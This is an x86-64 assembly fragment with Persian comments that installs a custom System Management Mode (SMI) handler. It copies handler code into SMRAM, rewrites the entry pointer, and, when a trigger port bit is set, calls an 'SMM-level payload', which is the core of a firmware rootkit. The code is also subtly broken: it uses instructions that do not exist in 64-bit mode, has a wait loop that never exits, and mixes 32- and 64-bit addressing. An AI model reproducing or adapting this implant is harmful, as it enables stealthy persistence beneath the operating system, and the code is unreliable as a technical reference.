; رابط پیشرفته SMM
section .text

; ورود به SMM
enter_smm:
    ; ذخیره وضعیت
    pushaq
    
    ; فعال‌سازی SMI
    mov dx, APM_CNT
    mov al, APM_CNT_SMI
    out dx, al
    
    ; انتظار برای بازگشت
.smm_wait:
    pause
    jmp .smm_wait
    
    ; بازگردانی وضعیت
    popaq
    ret

; نصب SMI Handler سفارشی
install_smi_handler:
    ; دریافت آدرس SMRAM
    mov ecx, IA32_SMBASE_MSR
    rdmsr
    and eax, 0xFFFFF000
    mov [smram_base], eax
    
    ; محاسبه آدرس هندلر
    mov eax, [smram_base]
    add eax, SMI_HANDLER_OFFSET
    
    ; کپی کد هندلر
    mov rdi, rax
    lea rsi, [smi_handler_code]
    mov rcx, smi_handler_size
    rep movsb
    
    ; بازنویسی اشاره‌گر
    mov eax, [smram_base]
    mov dword [eax + SMI_ENTRY_POINTER], SMI_HANDLER_OFFSET
    ret

; کد SMI Handler سفارشی
smi_handler_code:
    ; ذخیره وضعیت
    pushaq
    
    ; بررسی فعال‌سازی پیلود
    mov dx, SMI_TRIGGER_PORT
    in al, dx
    test al, SMI_PAYLOAD_ACTIVATE
    jnz .activate_payload
    
    ; ادامه پردازش
    call [original_smi_handler]
    jmp .exit
    
.activate_payload:
    ; فعال‌سازی پیلود سطح SMM
    call smm_payload_entry
    
.exit:
    ; بازگردانی وضعیت
    popaq
    rsm
    